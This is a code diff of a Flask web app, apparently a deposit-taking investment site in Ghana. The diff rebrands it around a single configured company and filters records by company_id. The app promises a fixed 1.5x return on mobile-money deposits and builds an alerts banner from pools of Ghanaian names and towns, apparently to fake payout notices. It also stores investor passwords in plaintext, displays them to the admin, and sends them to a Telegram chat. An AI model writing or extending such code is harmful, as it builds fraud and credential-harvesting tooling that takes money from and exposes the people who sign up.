-    <meta charset="UTF-8"><title>Admin Dashboard</title>
+    <meta charset="UTF-8"><title>Admin Dashboard - {{ company.name }}</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 1200px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { color: #028a0f; float: left; margin-top: 0; }
+        h2 { color: {{ company.theme_color }}; float: left; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
         .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
         table { width: 100%; border-collapse: collapse; margin-top: 10px; }
         th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
-        th { background-color: #2e7d32; color: white; }
-        .btn-action { background: #2e7d32; color: white; padding: 5px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
+        th { background-color: {{ company.theme_color }}; color: white; }
+        .btn-action { background: {{ company.theme_color }}; color: white; padding: 5px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
         .btn-payout { background: #d32f2f; }
         img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; }
         .edit-form { display: flex; gap: 4px; margin-top: 4px; align-items: center; }
@@ -1011,13 +989,13 @@ ADMIN_DASHBOARD_TEMPLATE = """
 <body>
     <div class="container">
         <div>
-            <h2>Admin Dashboard</h2>
+            <h2>{{ company.short_name }} Admin Dashboard</h2>
             <div class="logout"><a href="{{ url_for('admin_logout') }}">Logout</a></div>
             <div style="clear: both;"></div>
         </div>
 
         <div class="settings-box">
-            <h3>⚙️ Update Company Payment Details</h3>
+            <h3>⚙️ Update {{ company.short_name }} Payment Details</h3>
             <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
                 <div style="flex: 1;"><label style="font-size: 12px; font-weight:bold;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%;"></div>
                 <div style="flex: 2;"><label style="font-size: 12px; font-weight:bold;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%;"></div>
@@ -1025,7 +1003,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
             </form>
         </div>
 
-        <h3>Registered Investors & Portfolio Management</h3>
+        <h3>Registered Investors & Portfolio Management ({{ company.short_name }})</h3>
         <table>
             <thead>
                 <tr>
@@ -1042,7 +1020,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
                 {% if flat_investments %}
                     {% for item in flat_investments %}
                     <tr>
-                        <td><strong>{{ item.name }}</strong><br>{{ item.number }}<br><small style="color:#028a0f;"><b>({{ item.company }})</b></small></td>
+                        <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
                         <td>
                             <span><b>Pass:</b> {{ item.password }}</span>
                             <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
@@ -1052,7 +1030,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
                         </td>
                         <td>
                             <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
-                            <small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
+                            <small style="color:{{ company.theme_color }};">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
                             <small>ID: {{ item.transaction_id }}</small><br>
                             {% if item.screenshot %}
                                 <a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank">
@@ -1089,7 +1067,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
                     </tr>
                     {% endfor %}
                 {% else %}
-                    <tr><td colspan="7" style="text-align: center; color: #666;">No registrations found.</td></tr>
+                    <tr><td colspan="7" style="text-align: center; color: #666;">No registrations found for {{ company.short_name }}.</td></tr>
                 {% endif %}
             </tbody>
         </table>
@@ -1099,19 +1077,8 @@ ADMIN_DASHBOARD_TEMPLATE = """
 """
 
 
-@app.route("/switch-company/<comp_key>")
-def set_company(comp_key):
-  if comp_key in COMPANIES:
-    session["company_key"] = comp_key
-  return redirect(url_for("index"))
-
-
 @app.route("/", methods=["GET", "POST"])
 def index():
-  if "company_key" not in session:
-    session["company_key"] = DEFAULT_COMPANY_KEY
-
-  company = get_active_company()
   settings = load_settings()
 
   if request.method == "POST":
@@ -1147,6 +1114,7 @@ def index():
       expected_return = amount * 1.5
 
       investor_data = {
+          "company_id": COMPANY["id"],
           "name": name,
           "number": number,
           "password": password,
@@ -1162,13 +1130,12 @@ def index():
           "maturity_date": "Pending Approval",
           "status": "Pending Admin Payment Confirmation",
           "profile_pic": "",
-          "company": company["short"]
       }
 
       save_investor_data(investor_data)
 
       telegram_message = (
-          f"🚨 <b>NEW USER REGISTRATION ({company['name']})</b>\n\n"
+          f"🚨 <b>NEW USER REGISTRATION ({COMPANY['short_name']})</b>\n\n"
           f"👤 <b>Full Name:</b> {name}\n"
           f"📞 <b>Phone Number:</b> {number}\n"
           f"🔑 <b>Account Password:</b> {password}\n"
@@ -1185,6 +1152,7 @@ def index():
           os.path.join(app.config["UPLOAD_FOLDER"], filename)
           if filename
           else None,
+          company_name=COMPANY["name"],
       )
 
       session.permanent = True
@@ -1198,13 +1166,19 @@ def index():
       flash("Invalid input. Please check your data.")
       return redirect(url_for("index"))
 
+  banner_html = ALERTS_TOP_HTML.format(
+      company_gradient=COMPANY["gradient"],
+      company_border=COMPANY["border_color"],
+      company_short_name=COMPANY["short_name"],
+      names_json=json.dumps(GHANA_NAMES_POOL),
+      towns_json=json.dumps(GHANA_TOWNS_POOL),
+  )
+
   return render_template_string(
       HTML_TEMPLATE,
-      company=company,
-      companies=COMPANIES,
-      company_key=session.get("company_key"),
+      company=COMPANY,
       settings=settings,
-      zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
+      alerts_banner_html=banner_html,
   )
 
 
@@ -1216,7 +1190,10 @@ def api_track():
 
   investors = load_investors()
   for inv in investors:
-    if inv.get("number") == number:
+    if (
+        inv.get("number") == number
+        and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+    ):
       if inv.get("password") != password:
         return jsonify({"success": False, "message": "Incorrect Password."})
 
@@ -1230,7 +1207,6 @@ def api_track():
                 ),
                 "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
-                "company": inv.get("company", "Zenith")
             }
         ]
       cleaned_investments = []
@@ -1242,7 +1218,6 @@ def api_track():
             ),
             "maturity_date": slot.get("maturity_date", "Pending Approval"),
             "status": slot.get("status"),
-            "company": slot.get("company", "Zenith")
         })
       return jsonify({
           "success": True,
@@ -1251,25 +1226,31 @@ def api_track():
       })
 
   return jsonify(
-      {"success": False, "message": "No account found with this phone number."}
+      {
+          "success": False,
+          "message": f"No account found with this phone number under {COMPANY['short_name']}.",
+      }
   )
 
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-  company = get_active_company()
   if request.method == "POST":
     number = request.form.get("number", "").strip()
     password = request.form.get("password", "").strip()
     investors = load_investors()
     for inv in investors:
-      if inv.get("number") == number and inv.get("password") == password:
+      if (
+          inv.get("number") == number
+          and inv.get("password") == password
+          and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+      ):
         session.permanent = True
         session["investor_number"] = number
         return redirect(url_for("dashboard"))
     flash("Invalid phone number or password.")
     return redirect(url_for("login"))
-  return render_template_string(INVESTOR_LOGIN_TEMPLATE, company=company)
+  return render_template_string(INVESTOR_LOGIN_TEMPLATE, company=COMPANY)
 
 
 @app.route("/dashboard")
@@ -1278,7 +1259,6 @@ def dashboard():
   if not number:
     return redirect(url_for("login"))
 
-  company = get_active_company()
   investors = load_investors()
   investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
   investments_found = []
@@ -1289,7 +1269,10 @@ def dashboard():
   pending_balance = 0.0
 
   for inv in investors:
-    if inv.get("number") == number:
+    if (
+        inv.get("number") == number
+        and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+    ):
       investor_info = {
           "name": inv.get("name", "Investor"),
           "number": number,
@@ -1310,7 +1293,6 @@ def dashboard():
                 "date_time": inv.get("date_time"),
                 "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
-                "company": inv.get("company", "Zenith")
             }
         ]
 
@@ -1319,8 +1301,6 @@ def dashboard():
         slot_copy["sub_idx"] = f"{number}_{s_idx}"
         if "expected_return" not in slot_copy:
           slot_copy["expected_return"] = slot_copy["amount"] * 1.5
-        if "company" not in slot_copy:
-          slot_copy["company"] = "Zenith"
 
         status = slot_copy.get("status", "")
         if status == "Payment Confirmed & Active":
@@ -1346,19 +1326,19 @@ def dashboard():
 
   return render_template_string(
       INVESTOR_DASHBOARD_TEMPLATE,
+      company=COMPANY,
       investments=investments_found,
       investor=investor_info,
-      company=company,
       settings=settings,
       current_balance=current_balance,
       pending_balance=pending_balance,
-      zenith_ticker_interval_ms=ZENITH_TICKER_INTERVAL_MS,
-      zenith_min_withdrawal_multiple=ZENITH_MIN_WITHDRAWAL_MULTIPLE,
-      zenith_max_withdrawal_multiple=ZENITH_MAX_WITHDRAWAL_MULTIPLE,
-      zenith_max_visible_items=ZENITH_MAX_VISIBLE_ITEMS,
-      zenith_sidebar_width=ZENITH_SIDEBAR_WIDTH,
-      zenith_sidebar_padding=ZENITH_SIDEBAR_PADDING,
-      zenith_sidebar_max_height=ZENITH_SIDEBAR_MAX_HEIGHT,
+      ticker_interval_ms=TICKER_INTERVAL_MS,
+      min_multiplier=MIN_WITHDRAWAL_MULTIPLE,
+      max_multiplier=MAX_WITHDRAWAL_MULTIPLE,
+      max_visible_items=MAX_VISIBLE_ITEMS,
+      sidebar_width=SIDEBAR_WIDTH,
+      sidebar_padding=SIDEBAR_PADDING,
+      sidebar_max_height=SIDEBAR_MAX_HEIGHT,
   )
 
 
@@ -1368,11 +1348,13 @@ def profile_page():
   if not number:
     return redirect(url_for("login"))
 
-  company = get_active_company()
   investors = load_investors()
   investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
   for inv in investors:
-    if inv.get("number") == number:
+    if (
+        inv.get("number") == number
+        and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+    ):
       investor_info = {
           "name": inv.get("name", "Investor"),
           "number": number,
@@ -1384,8 +1366,8 @@ def profile_page():
 
   return render_template_string(
       INVESTOR_PROFILE_TEMPLATE,
+      company=COMPANY,
       investor=investor_info,
-      company=company,
       default_avatar_svg=DEFAULT_AVATAR_SVG,
   )
 
@@ -1398,7 +1380,10 @@ def update_profile():
 
   investors = load_investors()
   for inv in investors:
-    if inv.get("number") == number:
+    if (
+        inv.get("number") == number
+        and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+    ):
       inv["name"] = request.form.get("name", inv.get("name"))
       inv["work"] = request.form.get("work", inv.get("work"))
       inv["region"] = request.form.get("region", inv.get("region"))
@@ -1429,9 +1414,11 @@ def topup(sub_idx):
   try:
     number, idx_str = sub_idx.split("_")
     investors = load_investors()
-    company = get_active_company()
     for inv in investors:
-      if inv.get("number") == number:
+      if (
+          inv.get("number") == number
+          and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+      ):
         topup_amt = float(request.form["topup_amount"])
         topup_proof = request.form.get("topup_proof", "").strip()
         file = request.files.get("topup_screenshot")
@@ -1452,7 +1439,6 @@ def topup(sub_idx):
             "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
             "maturity_date": "Pending Approval",
             "status": "Pending Admin Payment Confirmation",
-            "company": company["short"]
         }
 
         if "investments" not in inv:
@@ -1461,10 +1447,11 @@ def topup(sub_idx):
         save_all_investors(investors)
 
         send_telegram_alert(
-            f"📈 <b>NEW TOP-UP SUBMISSION ({company['name']})</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital: GHs {topup_amt}",
+            f"📈 <b>NEW TOP-UP SUBMISSION</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital: GHs {topup_amt}",
             os.path.join(app.config["UPLOAD_FOLDER"], filename)
             if filename
             else None,
+            company_name=COMPANY["name"],
         )
         flash("Top-up submitted successfully for confirmation!")
   except Exception:
@@ -1478,15 +1465,18 @@ def withdraw(sub_idx):
     number, idx_str = sub_idx.split("_")
     idx = int(idx_str)
     investors = load_investors()
-    company = get_active_company()
     for inv in investors:
-      if inv.get("number") == number:
+      if (
+          inv.get("number") == number
+          and inv.get("company_id", COMPANY["id"]) == COMPANY["id"]
+      ):
         inv_list = inv.get("investments", [])
         if 0 <= idx < len(inv_list):
           inv_list[idx]["status"] = "Withdrawal Requested"
           save_all_investors(investors)
           send_telegram_alert(
-              f"📥 <b>WITHDRAWAL REQUESTED ({company['name']})</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n💰 Payout Due: GHs {inv_list[idx]['expected_return']}"
+              f"📥 <b>WITHDRAWAL REQUESTED</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n💰 Payout Due: GHs {inv_list[idx]['expected_return']}",
+              company_name=COMPANY["name"],
           )
           flash("Withdrawal request submitted successfully!")
   except Exception:
@@ -1502,7 +1492,7 @@ def admin_login():
       session["admin_logged_in"] = True
       return redirect(url_for("admin_dashboard"))
     flash("Incorrect password.")
-  return render_template_string(ADMIN_LOGIN_TEMPLATE)
+  return render_template_string(ADMIN_LOGIN_TEMPLATE, company=COMPANY)
 
 
 @app.route("/admin-dashboard")
@@ -1513,6 +1503,8 @@ def admin_dashboard():
   investors = load_investors()
   flat_investments = []
   for p_idx, inv in enumerate(investors):
+    if inv.get("company_id", COMPANY["id"]) != COMPANY["id"]:
+      continue
     inv_list = inv.get("investments", [])
     if not inv_list and "amount" in inv:
       inv_list = [
@@ -1526,7 +1518,6 @@ def admin_dashboard():
               "date_time": inv.get("date_time"),
               "maturity_date": inv.get("maturity_date", "Pending Approval"),
               "status": inv.get("status"),
-              "company": inv.get("company", "Zenith")
           }
       ]
     for s_idx, slot in enumerate(inv_list):
@@ -1538,13 +1529,12 @@ def admin_dashboard():
       item["password"] = inv.get("password", "123456")
       item["work"] = inv.get("work", "-")
       item["region"] = inv.get("region", "-")
-      if "company" not in item:
-        item["company"] = "Zenith"
       flat_investments.append(item)
 
   settings = load_settings()
   return render_template_string(
       ADMIN_DASHBOARD_TEMPLATE,
+      company=COMPANY,
       flat_investments=flat_investments,
       settings=settings,
   )
